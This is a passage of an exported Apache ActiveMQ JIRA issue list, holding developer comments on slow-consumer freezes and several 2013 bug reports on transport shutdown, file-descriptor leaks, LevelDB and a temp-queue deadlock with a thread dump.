The logs proves the theory as you can see at the end of it, during the broker shutdown procedure the connections are released and some consumption of the messages proceed but this is too late as AMQ had to abort those connections earlier during the slow consumer strategy procedure. ;;;","11/Sep/13 14:03;tabish;Can you clarify which test case you are using and what its current configuration is.  You've referenced a couple things so I'm a bit confused now on which one you are looking at.  Perhaps you can attached your current test case with the configuration that's not working so I know I'm looking at the right thing.  ;;;","11/Sep/13 14:19;wdudek;The test case still failing;;;","11/Sep/13 22:59;tabish;Updated the freeze test with additional testing logic and debug data.  ;;;","12/Sep/13 22:33;tabish;updated;;;","13/Sep/13 18:06;tabish;updated test case. ;;;","16/Sep/13 15:18;dejanb;Hi,

I started investigating an AMQFreeze test in more details. One thing that seems off to me is that all consumers on the InputQueue are using the same connection. My impression is that you're trying to simulate multiple applications (using each they're own connection) is misbehaving and being reconnected. As we have it here, all the misbehaving consumers are killing the same connection multiple times very frequently. Can you please confirm what's the intention of the test and maybe modify test accordingly?;;;","16/Sep/13 15:26;dejanb;Attached is a bit modified broker config for the test. We recommend using:

- conditionalNetworkBridgeFilterFactory policy and larger ttl, as consumers can come and go to different brokers and we need to be able to pass messages back and forth

- ignoreIdleConsumers=""true"" as we don't want to kill connections of idle consumers;;;","16/Sep/13 16:06;wdudek;The configuration for ActiveMQ broker & spring consumers reflect exectly our production configuration. 
If we should change something here just let me know.
This models our 25 consumers which simulatanously process the messages on the InputQueue 
and send the receipts to the ReceiptQueue.

I agree it is very weird test case as we tried to simulate unsafe ""kill"" command/or 
other unexpected scenario and possibly a bug in the application which might result in ActiveMQ or queue freeze. 
I am sure that the good designed software and normal processing is working perfectly until something unusual happened 
or a bug in code. It is a very rare case when we have to remove all the messages/and restart all applications 
to let AMQ keep working but if it happens it is very serious outage.

In some our testing after upgrading to AMQ 5.8 we have experienced worse scenario yet 
when even restarting of AMQ and consumers did not help to keep processing. 
We will keep trying to recreate the scenario as the upgrading does not eliminate the ""freezes"" 
and it is very serious issue. 

What we do here is we put messages to INPUT_QUEUE and the 25 consumers, this time configured to use spring, 
consume them putting a receipt to RECEIPT_QUEUE. 
Next we have consumers which consume the messages from RECEIPT_QUEUE. 
So after TC ends both INPUT_QUEUE & RECEIPT_QUEUE should be empty. 
If not it indicates some freeze or TC ended too fast /we could give some sleep option to give a chance for AMQ 
to consume the messages/.;;;","16/Sep/13 22:52;tabish;Modded test case using embedded brokers.  With changes to the spring response processor.  Broker restart at end clears wrong queue stats. ;;;","18/Sep/13 14:36;dejanb;It still unusual to me to call all these interrupts, as I cannot image a scenario in real life that will do the similar thing to the application.

Anyhow, I did some changes to the configuration of thins I have a test that now passes all the time for me (please find it attached). Things that are changed:

- one of the most important things is to move spring consumer to client acknowlegdment (look listener.xml). The spring container will synchronosuly receive messages and pass them to listener. So in case of the long running listener, the message is acked imidiatelly, which causes problems later.
- conditionalNetworkBridgeFilterFactory policy and larger ttl, as consumers can come and go to different brokers and we need to be able to pass messages back and forth
- ignoreIdleConsumers=""true"" as we don't want to kill connections of idle consumers
- abortConnection=""false"" as we don't want to kill the connection just a misbehaving consumer

Can you guys run this version of the test and see how it works for you?;;;","18/Sep/13 16:22;wdudek;For me the last AMQFreezeTest.zip is still failing both using the 5.8 snapshot containing the slow abort consumer strategy and latest 5.9 binaries.;;;","18/Sep/13 16:39;wdudek;Please advise why do you think the auto_acknowledge option should not be used? 

I managed to get the both test cases to pass using the ignoreIdleConsumers=""false"" and abortConnection=""true"" 
if we consider the traces only /the messages really received/ and not taking into account the wrong statistics. I got all the messages consumed by the spring consumers. The slow strategy after being triggered a few times was able to close the connections and they have been recreated by spring consumers only so I had to modify the test cases to use the spring configuration for both INPUT_QUEUE & RECEIPT_QUEUE.
I used the original test cases in form I sent here with the mentioned modifications.

What might be the risk for us to use the ignoreIdleConsumers=""false"" and abortConnection=""true""?;;;","18/Sep/13 16:48;tabish;Idle consumers are consumers that have no outstanding dispatched messages.  These consumer have nothing to do and therefore would always trip the slow condition and eventually be closed.  In the case of having the abortConnection=true this means that you'd have consumer connection coming and going for no real reason which could impact performance of your application.  I don't see why you'd want to not just ignore the idle one's and only focus on consumers that have not ack'd outstanding messages in the allocated time.  ;;;","18/Sep/13 19:00;tabish;Running with Dejan's configuration I see the test passing consistently now. ;;;","19/Sep/13 06:43;wdudek;For me it has also passed 90-95% times but I sent you the case when it failed. Also please notice the wrong statistics there. We had there above 1000 messages or even -2. Why? 
I do not want it to pass 99% but 100% because we have on the production rare case when we have to remove all the messages from all queues because of such ""freeze"" (nothing else helps). This is the reason I am a bit pushy to get it solved completly. 
As for the parameters with ignoreIdleConsumers=""false"" and abortConnection=""true"" I managed to get 100% of success runs ignoring statistics however. With ignoreIdleConsumers=""true"" none of the two test cases does not work for me every time. With abortConnection=""false"" only kahaPendingMessages.zip is going to work, the AMQFreezeTest is failing simetimes.
We really need to get rid of the AMQ freezes which are very bad and cost much also as for the mainenance.
Could you advise why ignoreIdleConsumers=""false"" helps so much but you said it should not? Anyway I would like to avoid setting this.

Also please use the original test case as we can modify any test case to pass but I need to know reasons for any change to our application as for AUTO_ACKNOWLEDGE before puting it in the late state of our project. We need the code to reflect out production design.


;;;","19/Sep/13 08:54;dejanb;The problem is how the spring message listener works. It doesn't use message listener like you would in a JMS app. Instead it does receive() on the session, gets the message and manually executes onMessage() on the listener. In auto acknowledge mode as soon as receive() is done, the message is acked and considered processed. So the message that sleeps forever will not be resent to other consumers when this consumer is detected slow. Turning to client acknowlement Spring actually manually acks the message when onMessage() completes. So when we close the consumer, the current long-sleeping message will be replayed to other consumers.;;;","19/Sep/13 11:32;wdudek;Thank you for your comment!
We do not care about the long-sleeping message but about all the prefetched messages for the sleeping consumer which needs to be redispatched & delivered to other consumers. This is all what needs to be guaranteed here no matter what option we are going to use in the spring listener we do not want the “freeze” - meaning that all pending/prefetched messages have to be re-dispatched from such “slow” /or frozen/ consumers to other ones. However I am still concerned about the ignoreIdleConsumers=""false"" and abortConnection=""true"" which is going to work for me. Why ignoreIdleConsumers=""false"" helps so much when you said it should not? Could it be checked as we would like to avoid this?;;;","23/Sep/13 10:29;wdudek;I used the last test case from: https://fusesource.com/issues/browse/ENTMQ-409
and tested it on my laptop.
Results: Tests run: 20 Failed: 8

I attached logs from the failed tests:
LOGS_FAILED_5.9.0.redhat-610-SNAPSHOT.zip

I have also checked it on very slow Solaris system where I was not able to get the test case passed even once/see attached logs/.

After changing only the options to have abortConnection=""true"" ignoreIdleConsumers=""false"" I managed to pass the test case on the Solaris environment and got better results on the laptop with Windows OS: Tests run: 20 Failed 2

So I was able to get the test case failed even with abortConnection=""true"" ignoreIdleConsumers=""false"" but it behaved much better with these options.

For testing I used the oryginal TC and 5.9.0.redhat-610-SNAPSHOT from:

http://repo.fusesource.com/nexus/content/repositories/snapshots/

As for activemq-all we had only those:
5.9-fuse-SNAPSHOT/  Thu Jun 27 11:57:53 UTC 2013        
5.9.0.redhat-610-SNAPSHOT/  Sat Sep 21 00:34:04 UTC 2013  
;;;","21/Mar/14 12:42;gtully;Using abortConnection=false is viable with https://issues.apache.org/jira/browse/AMQ-5114 - the broker will always see a local remove when teh sub is aborted, even if the remote sub is slow to respond or never responds.;;;",,,,,
shutdown of VMTransportServer should report disposed exception to peer pending requests,AMQ-4532,12647385,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,13/May/13 21:41,13/May/13 21:45,14/Jul/23 05:43,13/May/13 21:45,5.8.0,,,,,5.9.0,,,Transport,,,,0,asyncRequest,shutdown,vmtransport,,,,,,"When a broker is shutdown all transport connectors are shutdown ok. However a vm client with pending asyncRequests does not get a notification of the peer (server in this case) shutdown and waits for ever.
This is noticeable in camel routes that do graceful shutdown from a shutdown hook when there are pending requests.

The current shutdown/stop logic sends a shutdowninfo which works fine when the client initiates the stop but shutdown in not processed by a client.
A simple fix is to propagate a shutdown/disposed exception that clients will respond to and error out any pending futures.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327741,,,Mon May 13 21:45:19 UTC 2013,,,,,,,,,,,"0|i1kjqf:",328085,,,,,,,,,,,,,,,,,,,,,"13/May/13 21:45;gtully;fix in http://svn.apache.org/r1482117;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TcpTransportServer can leak FDs when maximumConnection is set and the limit exceeded,AMQ-4531,12647333,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,13/May/13 17:01,07/Aug/13 10:14,14/Jul/23 05:43,13/May/13 17:45,5.8.0,,,,,5.9.0,,,Transport,,,,0,,,,,,,,,We don't close accepted sockets when we reach maximumConnections which can lead to leaking File Descriptors over time.  ,,choijw1,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327689,,,Wed Aug 07 10:14:48 UTC 2013,,,,,,,,,,,"0|i1kjev:",328033,,,,,,,,,,,,,,,,,,,,,"13/May/13 17:45;tabish;Fixed on trunk.;;;","07/Aug/13 08:18;choijw1;Could you point to the changes/fix you made? Also wonder if this bug exists with 5.7.0 as well.  I'm seeing a similar fd leak issues especially with huge amount of connections.;;;","07/Aug/13 10:14;tabish;Look under the source tab of this issue for a list of changed files, you can even generate a patch file from there. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web unable to show StringProperties on Message,AMQ-4530,12647272,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kaaveland,kaaveland,13/May/13 09:34,13/May/13 15:37,14/Jul/23 05:43,13/May/13 15:37,5.8.0,5.9.0,,,,5.9.0,,,,,,,0,patch,,,,,,,,"When browsing queues with jconsole or using the web console, I am unable to obtain any StringProperties on a message. Despite this, they do show up in PropertiesText.

I have investigated and made a testcase and a patch, but they are both ugly and hackish so someone needs to review them.

The problem stems from the createTabularData in OpenTypeSupport, where an instanceof check against String is performed on property values. String properties however seem to be instances of org.fusesource.hawtbuf.UTF8Buffer, which (obviously) doesn't subclass String, so they aren't put in the TabularDataSupport return-value.

As near as I can tell, this affects both trunk and 5.8, but I haven't checked it against 5.7.0.",Not really relevant.,andreaja,kaaveland,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"13/May/13 09:35;kaaveland;AMQ4530Test.java;https://issues.apache.org/jira/secure/attachment/12582911/AMQ4530Test.java","13/May/13 09:36;kaaveland;amq4530.patch;https://issues.apache.org/jira/secure/attachment/12582912/amq4530.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327628,,,Mon May 13 15:37:10 UTC 2013,,,,,,,Patch Available,,,,"0|i1kj1b:",327972,,,,,,,,,,,,,,,,,,,,,"13/May/13 09:35;kaaveland;Unittest that demonstrates the issue.;;;","13/May/13 09:36;kaaveland;Patch that fixes broken build and solves the issue.;;;","13/May/13 15:37;tabish;Patch applied, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
leveldb store NPEs when you send to a composite destination.,AMQ-4529,12647013,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,10/May/13 14:01,23/May/13 18:31,14/Jul/23 05:43,23/May/13 18:31,,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,,,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,327370,,,Thu May 23 18:31:03 UTC 2013,,,,,,,,,,,"0|i1khfz:",327714,,,,,,,,,,,,,,,,,,,,,"10/May/13 14:11;chirino;Fix in trunk;;;","14/May/13 11:28;gtully;the change to messageId to share the dataLocation in a copy breaks:
{code}org.apache.activemq.broker.JdbcXARecoveryBrokerTest#testQueuePersistentCommited2PhaseMessagesNotLostOnRestart{code} which changes the dataLocation on the fly, so it needs to be a unique reference after a copy.

What is the nature of the leveldb npe? Is it a case that the dataLocation is updated after the copy?
The jdbc store caches data in this value, maybe it can use something else.;;;","14/May/13 13:32;chirino;yeah perhaps the entryLocator.  That should be unique per queue the message is in.;;;","23/May/13 18:31;chirino;Fix was applied to the jdbc impl.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Broken link on the How can I monitor the connection with the broker doc page,AMQ-4525,12646623,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jsherman1,jsherman1,08/May/13 14:14,08/May/13 14:26,14/Jul/23 05:43,08/May/13 14:26,,,,,,,,,Documentation,,,,0,,,,,,,,,"There is a broken link on the How can I monitor the connection with the broker documentation page [1].  The link references addTransportListener() method on the ActiveMQConnection and points to http://activemq.apache.org/maven/activemq-core/apidocs/org/apache/activemq/ActiveMQConnection.html#addTransportListener(org.apache.activemq.transport.TransportListener) which returns a 404 Not Found Error. 

Can this link be updated to: http://activemq.apache.org/maven/apidocs/org/apache/activemq/ActiveMQConnection.html#addTransportListener(org.apache.activemq.transport.TransportListener)


[1] http://activemq.apache.org/how-can-i-monitor-the-connection-with-the-broker.html",,jsherman1,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326981,,,Wed May 08 14:26:13 UTC 2013,,,,,,,,,,,"0|i1kerj:",327325,,,,,,,,,,,,,,,,,,,,,"08/May/13 14:26;tabish;Done, should update in a bit;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MasterLevelDBStore does not shutdown its protocol server when stopped,AMQ-4519,12646495,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,07/May/13 20:28,07/May/13 20:30,14/Jul/23 05:43,07/May/13 20:30,5.9.0,,,,,,,,LevelDB,,,,0,,,,,,,,,"Mistype? When master level DB is stopped, the transport server is ""started"" instead of ""stopped"". ",,ceposta,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326853,,,Tue May 07 20:30:16 UTC 2013,,,,,,,,,,,"0|i1kdzb:",327198,,,,,,,,,,,,,,,,,,,,,"07/May/13 20:30;ceposta;Fixed w/ r1480060 on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The Advisory for Messages being sent to the DLQ is sent regardless of the Message actually being DLQd,AMQ-4517,12646435,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,07/May/13 16:19,07/May/13 21:17,14/Jul/23 05:43,07/May/13 21:17,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,When we attempt to send a Message to the DLQ we allow for various settings to determine if the Message in fact get placed in the DLQ or discarded.  Right now we send the advisory even if we end up discarding the Message which could lead to some confusion. ,,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326793,,,Tue May 07 21:17:49 UTC 2013,,,,,,,,,,,"0|i1kdlz:",327138,,,,,,,,,,,,,,,,,,,,,"07/May/13 21:17;tabish;Fixed on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Don't decrement topic enqueues when messages are expired,AMQ-4516,12646416,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,ceposta,ceposta,ceposta,07/May/13 14:37,07/May/13 14:39,14/Jul/23 05:43,07/May/13 14:39,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When messages expire from a topic, the destination statistics are updated to reflect the expire, but it also decrements the enqueue counters which proves to be a little confusing. Once a message has been ""enqueued"", the destination should always reflect that a message was ""enqueued"" even if it eventually becomes expired. From this mailing list message:

http://activemq.2283324.n4.nabble.com/Question-regarding-to-EnqueueCount-and-ExpiredCount-for-topic-destination-tt4666634.html",,ceposta,paulgale,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,326774,,,Tue May 07 14:39:56 UTC 2013,,,,,,,,,,,"0|i1kdhr:",327119,,,,,,,,,,,,,,,,,,,,,"07/May/13 14:39;ceposta;Fixed with svn r1479925;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock can occur on dispose of TempQueue that contains expired Messages,AMQ-4513,12646318,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,tabish,tabish,06/May/13 22:30,07/May/13 16:16,14/Jul/23 05:43,07/May/13 16:16,5.7.0,5.8.0,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When a TempQueue is being torn down and it contains expired Messages its possible for a deadlock occurs if the advisory for expired Message or DLQd fires at the same time as another Destination is created on the Broker.

{code}
Found one Java-level deadlock:
=============================
""ActiveMQ Transport: tcp:///127.0.0.1:53182@60490"":
  waiting to lock monitor 0x00007f9630020c80 (object 0x00000007c4541ff0, a java.util.concurrent.ConcurrentHashMap),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:53158@60490""
""ActiveMQ Transport: tcp:///127.0.0.1:53158@60490"":
  waiting for ownable synchronizer 0x00000007c4600f98, (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:53099@60490""
""ActiveMQ Transport: tcp:///127.0.0.1:53099@60490"":
  waiting to lock monitor 0x00007f9630020c80 (object 0x00000007c4541ff0, a java.util.concurrent.ConcurrentHashMap),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:53158@60490""

Java stack information for the threads listed above:
===================================================
""ActiveMQ Transport: tcp:///127.0.0.1:53182@60490"":
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:271)
	- waiting to lock <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap)
	at org.apache.activemq.broker.region.RegionBroker.addDestinationInfo(RegionBroker.java:297)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestinationInfo(AdvisoryBroker.java:189)
	at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217)
	at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestinationInfo(MutableBrokerFilter.java:223)
	at org.apache.activemq.broker.TransportConnection.processAddDestination(TransportConnection.java:527)
	at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:122)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:722)
""ActiveMQ Transport: tcp:///127.0.0.1:53158@60490"":
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x00000007c4600f98> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197)
	at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:945)
	at org.apache.activemq.broker.region.AbstractRegion.addDestination(AbstractRegion.java:128)
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:279)
	- locked <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap)
	at org.apache.activemq.broker.region.RegionBroker.addDestinationInfo(RegionBroker.java:297)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestinationInfo(AdvisoryBroker.java:189)
	at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217)
	at org.apache.activemq.broker.BrokerFilter.addDestinationInfo(BrokerFilter.java:217)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestinationInfo(MutableBrokerFilter.java:223)
	at org.apache.activemq.broker.TransportConnection.processAddDestination(TransportConnection.java:527)
	at org.apache.activemq.command.DestinationInfo.visit(DestinationInfo.java:122)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)
	at java.lang.Thread.run(Thread.java:722)
""ActiveMQ Transport: tcp:///127.0.0.1:53099@60490"":
	at org.apache.activemq.broker.region.RegionBroker.addDestination(RegionBroker.java:271)
	- waiting to lock <0x00000007c4541ff0> (a java.util.concurrent.ConcurrentHashMap)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.advisory.AdvisoryBroker.addDestination(AdvisoryBroker.java:174)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145)
	at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:389)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282)
	at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:550)
	at org.apache.activemq.advisory.AdvisoryBroker.messageExpired(AdvisoryBroker.java:291)
	at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)
	at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257)
	at org.apache.activemq.broker.MutableBrokerFilter.messageExpired(MutableBrokerFilter.java:269)
	at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1793)
	at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1786)
	at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1911)
	at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1854)
	at org.apache.activemq.broker.region.Queue.purge(Queue.java:1244)
	at org.apache.activemq.broker.region.TempQueue.dispose(TempQueue.java:95)
	at org.apache.activemq.broker.region.AbstractTempRegion.dispose(AbstractTempRegion.java:100)
	- locked <0x00000007c45a8718> (a org.apache.activemq.broker.jmx.ManagedTempQueueRegion)
	at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:216)
	at org.apache.activemq.broker.region.TempQueueRegion.removeDestination(TempQueueRegion.java:63)
	at org.apache.activemq.broker.jmx.ManagedTempQueueRegion.removeDestination(ManagedTempQueueRegion.java:63)
	at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:290)
	at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149)
	at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:202)
	at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149)
	at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149)
	at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:155)
	at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:815)
	- locked <0x00000007c46b1168> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)
	at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:72)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
